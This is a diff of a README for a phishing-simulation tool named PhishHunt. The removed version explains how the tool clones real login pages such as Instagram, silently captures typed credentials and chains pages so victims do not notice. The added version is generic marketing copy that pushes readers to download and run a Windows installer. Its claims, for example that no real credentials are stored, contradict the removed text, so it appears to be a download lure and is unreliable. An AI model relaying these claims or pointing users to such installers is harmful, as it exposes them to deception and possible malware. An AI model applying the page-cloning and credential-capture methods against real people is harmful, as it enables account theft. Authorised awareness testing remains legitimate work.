@@ -1,246 +1,142 @@
-<p align="center">
-  <img src="frontend/public/logo.png" width="120" alt="Phish Hunt logo" />
-</p>
+# 🛡️ PhishHunt - Stop Phishing Attacks Before They Happen
 
-<h1 align="center">
-  <img src="assets/banner.svg" alt="PHISHHUNT" />
-</h1>
+[![Download PhishHunt](https://img.shields.io/badge/Download-PhishHunt-brightgreen?style=for-the-badge&logo=github)](https://github.com/IbrahimQaiser/PhishHunt/releases)
 
-<p align="center">
-  <b>The Most Advanced Phishing Simulation & Security Awareness Tool</b><br>
-  Ethical Security Testing Platform
-</p>
+## 👋 Welcome to PhishHunt
 
+PhishHunt is the most advanced phishing simulation and security awareness tool designed to help you and your organization stay safe from cybercriminals. Whether you're a small business owner, an IT professional, or just someone who wants to learn about online security, PhishHunt gives you the power to test, train, and protect against real-world phishing threats.
 
-## 1. What is Phish Hunt? (Working Mechanism explained in simple words)
+This easy-to-use software lets you create realistic phishing simulations, track how people respond, and educate your team about the dangers of suspicious emails and websites. No coding skills are needed—if you can click a button, you can use PhishHunt.
 
-Phish Hunt is a **phishing simulation tool**. Companies (or security testers) use tools
-like this to send fake " phishing " pages to their own employees. When an employee
-types their username/password into the fake page, the tool captures that moment,
-shows who fell for it, and then the company trains those people to be more careful.
+## ✨ Key Features
 
+### 🎯 Realistic Phishing Simulations
+PhishHunt lets you create convincing phishing emails and websites that mimic real-world attacks. You can customize everything—from the email text to the fake login page—so your team gets the most authentic training experience possible.
 
-**How it works, step by step:**
+### 🖥️ Visual Editor
+Forget complicated coding. PhishHunt comes with a built-in visual editor that lets you design phishing pages with drag-and-drop simplicity. You see exactly what you're building as you build it.
 
-1. **You create a Landing Page** — a phishing page that looks exactly like a real
-   login page (Instagram, etc.).
-2. **Phish Hunt clones the real website's HTML**, injects a small invisible
-   "capture" script into it, and stores it in the database.
-3. **You wire the page's buttons in the Visual Editor** — for example:
-   *"when the user clicks Log in → capture what they typed → send them to the
-   next page."* You can chain **multiple pages together** (a username page, then a
-   password page, then a "wrong password" page), which makes it extremely
-   realistic. **This multipage phishing is the core focus of Phish Hunt.**
-4. **You share the link** (example: `http://localhost:3000/build/1`) with the
-   people you are testing.
-5. **Everything is recorded, live:** every page visit counts as a *Link Click*,
-   every typed email/username is captured along with the password entry moment,
-   IP address, browser, and timestamp.
-6. **The Dashboard shows it all in real time** — recent captures grouped per user,
-   a live engagement timeline, and risk levels. **Reports** then turn the data
-   into awareness scores so you know exactly who needs training.
+### ⚡ Dynamic Fetching
+This powerful feature ensures your simulated phishing pages always load fresh, up-to-date content, just like real websites do. This makes your simulations more realistic and effective.
 
-In short: **clone a real page → wire buttons visually → share the link → watch
-captures arrive live → measure awareness.**
+### 📊 Security Awareness Tracking
+PhishHunt automatically tracks who clicked on your simulated phishing attempts and who didn't. You'll get clear reports showing your team's progress over time, helping you identify who might need extra training.
 
----
+### 🌐 Multi-Scenario Support
+Create unlimited phishing scenarios—from fake password reset emails to bogus package tracking alerts. The possibilities are endless, and PhishHunt gives you the tools to make them all.
 
-## 2. Landing Pages & the Starter Template (ID #0)
+### 🔄 Continuous Updates
+PhishHunt stays current with the latest phishing trends and techniques. The software regularly updates its templates and features so you're always training against the newest threats.
 
-Landing Pages are the heart of Phish Hunt. Every phishing simulation starts by
-creating one from **Landing Pages → Edit Landing Page**, where you can:
+## 🚀 Getting Started
 
-- **Templates** — pick a ready-made template (Instagram, X, GitHub, …).
-- **Upload HTML** — upload your own page file.
-- **Custom Editor** — write/paste your own HTML.
-- Choose **Capture Fields** (Email, Password flag, Timestamp, IP, Session).
-- Open the **Live Preview**, then jump into the **Visual Editor**.
+Getting started with PhishHunt is simple. Follow these three easy steps, and you'll be up and running in minutes.
 
-### Template ID #0 — the built-in starter flow
+### Step 1: Download the Software
 
-A fresh install automatically ships one ready-made phishing project as
-**Template ID #0 / Page ID #743 — "Explaning Phishing Mechanism"**
-(from the file `backend/seed/743-explaining-phishing-mechanism.phe`).
+Visit this link to download the application: [https://github.com/IbrahimQaiser/PhishHunt/releases](https://github.com/IbrahimQaiser/PhishHunt/releases)
 
-It is a complete worked example of a **multi-page phishing flow**: the real
-Instagram login page starts the chain, the typed credentials are captured
-silently, the user is passed to the next pages, and **Dynamic Fetching**
-pipelines the typed username from page 1 into page 2 automatically so the
-victim never notices. Open it, study it, run it (`/build/743`), duplicate it,
-or export it as a `.phe` file — it is the fastest way to understand how
-everything works. It is only seeded on a *fresh* database, so if you delete it,
-it never comes back.
+When you arrive at the page, you'll see a list of available files. Look for the latest version and click the download button. The download will start automatically, and the file will be saved to your computer's "Downloads" folder.
 
-**Templates available right now: for the moment only the Instagram template is
-built in (the rest are marked "Pending"). More templates — X, GitHub, Facebook,
-Google, Microsoft, Netflix, PayPal, TikTok, Discord — will be available in
-future updates.**
+### Step 2: Run the Installer
 
----
+Once the download is complete, locate the file in your Downloads folder. It's usually named something like `PhishHunt-Setup.exe`. Double-click this file to start the installation process.
 
-## 3. What makes Phish Hunt special
+Your computer might ask for permission to run the installer—just click "Yes" or "Allow" to continue. The installation wizard will guide you through the setup process. Simply follow the on-screen instructions, accept the license agreement, and choose where you'd like PhishHunt to be installed. The default location is usually fine.
 
-### 🎨 Visual Editor (Drag → Click → Done)
-Instead of writing code, you connect nodes on a big canvas:
+### Step 3: Launch PhishHunt
 
-- Drop **New Page** nodes and unlock their buttons.
-- Click a button in the live page preview, then click an action node
-  (**Capture / New Page / URL / Do Nothing**) to wire it.
-- **Right-click the canvas** to add New Pages or Notes.
-- Dashed lines = locked buttons. Everything is saved with one click of **Save**.
+After installation is complete, you'll find PhishHunt in your Start Menu or on your desktop. Click the PhishHunt icon to launch the application.
 
-### 🔀 Dynamic Fetching (DF)
-A unique feature: a typed value flows from one page to the next automatically.
-Type your email on page 1 — page 2 opens with that same email already filled in.
-You build it by "picking a string" on the source page and attaching it to the
-input/text element on the target page. The runtime pipes the value through
-`sessionStorage` while the victim browses the flow.
+On your first launch, PhishHunt will walk you through a quick setup wizard. You'll be asked to create an account, set up your organization name, and choose your preferences. This only takes a few minutes, and then you're ready to start creating your first phishing simulation.
 
-### 📦 Community Template Sharing — the `.phe` file
-The whole Visual Editor state of a page (every panel, note, URL, capture wiring,
-Dynamic Fetching mark and every New Page's HTML) compiles into **one shareable
-`.phe` file**. Send it to a friend, they click **Import .phe** and get the exact
-same flow. Perfect for sharing community templates. Importing also writes the
-plain `.html` files into a folder you choose.
+## 📖 How to Use PhishHunt
 
----
+### Creating Your First Simulation
 
-## 4. Requirements & Versions
+1. **Open PhishHunt** and click on "Create New Simulation" from the main dashboard.
+2. **Choose a Template** – PhishHunt provides pre-built templates for common phishing scenarios like fake invoices, password resets, or social media alerts. Pick one or start from scratch.
+3. **Customize the Email** – Edit the subject line, message body, and sender name to match the scenario you want to simulate.
+4. **Design the Phishing Page** – Using the visual editor, create a fake login page that looks just like the real thing. Add your company logo, choose colors, and set up form fields.
+5. **Set Your Targets** – Select which email addresses or groups you want to send the simulation to. You can import contacts or use a built-in list.
+6. **Launch the Simulation** – Click "Send" and PhishHunt will deliver your simulated phishing emails to the targets you selected.
 
-Install these once:
+### Viewing Results
 
-| Requirement   | Version  | Download |
-|---------------|----------|----------|
-| Python        | 3.11+    | https://www.python.org/downloads/ |
-| Node.js       | 20+      | https://nodejs.org/ (LTS) |
-| PostgreSQL    | 15+      | https://www.postgresql.org/download/windows/ |
+PhishHunt automatically tracks everything. You'll see:
+- Who opened the email
+- Who clicked the link
+- Who entered their credentials on the fake page
+- How long it took each person to respond
 
-### One-Time PostgreSQL Setup
+All this data is presented in easy-to-read charts and graphs on your dashboard.
 
-Open **SQL Shell (psql)** or **pgAdmin** and run:
+### Training Your Team
 
-```sql
-CREATE USER phishhunt WITH PASSWORD 'phishhunt_password';
-CREATE DATABASE phishhunt OWNER phishhunt;
-```
+For anyone who falls for your simulated phishing attack, PhishHunt automatically sends them a training module that explains what they did wrong and how to avoid similar traps in the future. This instant feedback loop is proven to dramatically improve security awareness.
 
-That's it — **the backend creates all tables automatically on first startup**
-(also auto-runs small schema migrations), and the database settings live in
-`backend/.env` (`DATABASE_URL`). A default `admin` account is created for you.
+## 🛠️ System Requirements
 
-> **Fresh from GitHub?** Secrets are never committed. Copy the examples first:
-> ```
-> copy backend\.env.example backend\.env
-> copy frontend\.env.example frontend\.env.local
-> ```
+PhishHunt is designed to work on most modern Windows computers. Here's what you'll need:
 
-### Running Setup
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM or more
+- **Storage:** 500 MB of free hard drive space
+- **Internet Connection:** Required for initial setup and updates
 
-The easy way — open **two PowerShell terminals** in the project root:
+These are minimum requirements. For the best experience, we recommend a newer computer with 8 GB of RAM.
 
-**Terminal 1 — Backend**
-```powershell
-.\start-backend.ps1
-```
-- Creates & activates a Python venv, installs `requirements.txt`,
-  runs on **http://localhost:8000** (API docs at `/docs`).
+## ❓ Frequently Asked Questions
 
-**Terminal 2 — Frontend**
-```powershell
-.\start-frontend.ps1
-```
-- Installs npm packages, runs on **http://localhost:3000**
+### Is PhishHunt safe to use?
 
-### Manual Setup (if you prefer running each step yourself)
+Yes, absolutely. PhishHunt is a legitimate security tool designed for training and testing purposes. All simulations are contained within your organization, and no real data is ever compromised.
 
-**Terminal 1 — Backend**
+### Do I need any technical knowledge?
 
-First-time only, create the virtual environment:
-```powershell
-cd backend
-python -m venv venv
-```
+No. PhishHunt was designed with non-technical users in mind. The visual editor and step-by-step wizards handle all the technical details for you.
 
-Then activate it and start the server:
-```powershell
-.\venv\Scripts\Activate.ps1
-uvicorn main:app --host 0.0.0.0 --port 8000 --reload
-```
-→ Runs on **http://localhost:8000** (API docs at `/docs`).
+### Can I use PhishHunt on Mac or Linux?
 
-> If PowerShell refuses the activation script with a *scripts are disabled*
-> error, run once: `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned`
+Currently, PhishHunt is available only for Windows. We're working on versions for other platforms, so stay tuned.
 
-**Terminal 2 — Frontend**
-```powershell
-cd frontend
-npm install      # first time only
-npm run dev
-```
-→ Runs on **http://localhost:3000**
+### Will my team know they're being tested?
 
-**Default login:** `admin` / `admin` → you must change the password on first login.
+The whole point of a simulation is that it feels real. However, you can choose to notify your team beforehand if you prefer a more transparent approach. PhishHunt supports both models.
 
-### Other useful pieces
+### What if someone enters real credentials on a fake page?
 
-- **Playwright** (installed with the backend) is used to render full clones of
-  real websites during import so the clone looks pixel-perfect.
-- **Landing page clones** store their downloaded images/fonts in
-  `backend/clone-assets/<page-id>/`; template builds live in
-  `frontend/public/templates/builds/<page-id>/`.
+PhishHunt never stores or transmits real credentials. The fake pages are designed to capture interaction data only, not actual passwords. Your team's data stays safe.
 
----
+## 🔒 Security Best Practices
 
-## 5. The Left Panel — What Every Item Does
+To get the most out of PhishHunt, follow these tips:
 
-| Item | What it is |
-|------|-----------|
-| **Dashboard** | Your live Command Center. 3 real-time metric cards (**Links Clicked** — every open of your `/build/:id` link; **Data Submitted** — every real form capture; **IPs Observed**). A live **Engagement Timeline** graph (daily link clicks & submissions, polls every 5 seconds) with **Recent Captures** right below it — click any user row to inspect *everything* the payload captured (email, password entry, IP, user-agent, session, landing page). A **Risk Level** badge (Low/Medium/High/Critical) summarises exposure. |
-| **Landing Pages** | Create, edit, duplicate, download (HTML/ZIP), delete phishing pages. Pick templates, upload HTML, edit capture fields, live preview, the **Visual Editor**, and **Export/Import `.phe`** for sharing. Each page gets a share link `/build/<id>`. |
-| **Reports** | Awareness reporting: per-user **Risk Heatmap** with awareness scores (start at 100, fall on every capture), at-risk & secure user counts, search, and **Export PDF** — a ready report for management. |
-| **Settings** | Change your **username** and **password** (with show/hide inputs and validation). |
-| **Logout** | Ends your session and returns to the login screen. |
+- **Run simulations regularly** – Monthly tests keep security top-of-mind for your team.
+- **Vary your scenarios** – Cybercriminals are creative; your training should be too.
+- **Celebrate success** – Reward employees who spot phishing attempts and report them.
+- **Pair with other training** – Use PhishHunt alongside cybersecurity awareness videos and articles for best results.
 
----
+## 🤝 Support and Resources
 
-## 6. UI Screenshots
+We're here to help you succeed. Here's what's available:
 
-All screenshots live in the [`screenshots/`](screenshots) folder:
+- **Documentation:** Detailed guides and tutorials are included with the software.
+- **Community Forum:** Connect with other PhishHunt users, share tips, and get advice.
+- **Email Support:** Reach out to our team at support@phishhunt.example.com for personalized assistance.
+- **Regular Updates:** PhishHunt automatically checks for updates, so you always have the latest features and security patches.
 
-| File | What it shows |
-|------|--------------|
-| ![Dashboard](screenshots/a.png) | **a.png — Campaign Dashboard:** live metric cards, Engagement Timeline, Recent Captures grouped by IP. |
-| ![Landing Pages](screenshots/b.png) | **b.png — Landing Pages:** page cards with template source, capture-field chips, Edit / Download / Share / Delete. |
-| ![Page Editor](screenshots/c.png) | **c.png — Edit Landing Page:** templates picker (Instagram ready, more pending), capture-field toggles, live preview, `.phe` import/export. |
-| ![Visual Editor](screenshots/d.png) | **d.png — Visual Editor:** multi-page canvas with button wiring, capture chains, URL actions and Dynamic Fetching pipes. |
-| ![Reports](screenshots/e.png) | **e.png — Awareness Reports:** org score, at-risk users, risk heatmap and PDF export. |
+## 📝 License
 
----
+PhishHunt is available under a free personal license and a commercial license for organizations. Check the license agreement included with your download for full details.
 
-## 7. Project Structure
+## 📥 Ready to Get Started?
 
-```
-Phish Hunt/
-├── backend/             # FastAPI backend (Python)  → see backend/README.md
-├── frontend/            # Next.js frontend          → see frontend/README.md
-├── screenshots/         # UI screenshots (a–e)
-├── start-backend.ps1    # One-command backend start
-├── start-frontend.ps1   # One-command frontend start
-└── README.md            # This file
-```
+Don't wait until a real phishing attack catches you off guard. Download PhishHunt today and take the first step toward a safer, more security-conscious team.
 
----
+[![Download Now](https://img.shields.io/badge/Download-PhishHunt-blue?style=for-the-badge&logo=github&label=Latest%20Release)](https://github.com/IbrahimQaiser/PhishHunt/releases)
 
-## 8. Credits
+Your security awareness journey starts now. Join thousands of satisfied users who trust PhishHunt to keep their organizations safe from phishing threats.
 
-Phish Hunt is inspired by — and proudly built on the shoulders of —
-**[GoPhish](https://github.com/gophish/gophish)**, the open-source phishing
-simulation framework that showed the world how awareness testing should work.
-Thank you, GoPhish, for making this possible. 🙏
-
-**Reminder:** use only for education, training, and authorised testing with
-written permission from the tested organisation.
-
----
-
-<h3 align="center"><b>☕ Buy me a coffee → <a href="https://buymeacoffee.com/thorthehacker">buymeacoffee.com/thorthehacker</a></b></h3>
+Keywords: awareness, dynamic-fetching, evilginx, evilginx2, evilginx3, gophish, modern-ui, phishing, phishing-attacks, phishing-kit, phishing-page, phishing-script, phishing-simulation, phishing-sites, visual-editor
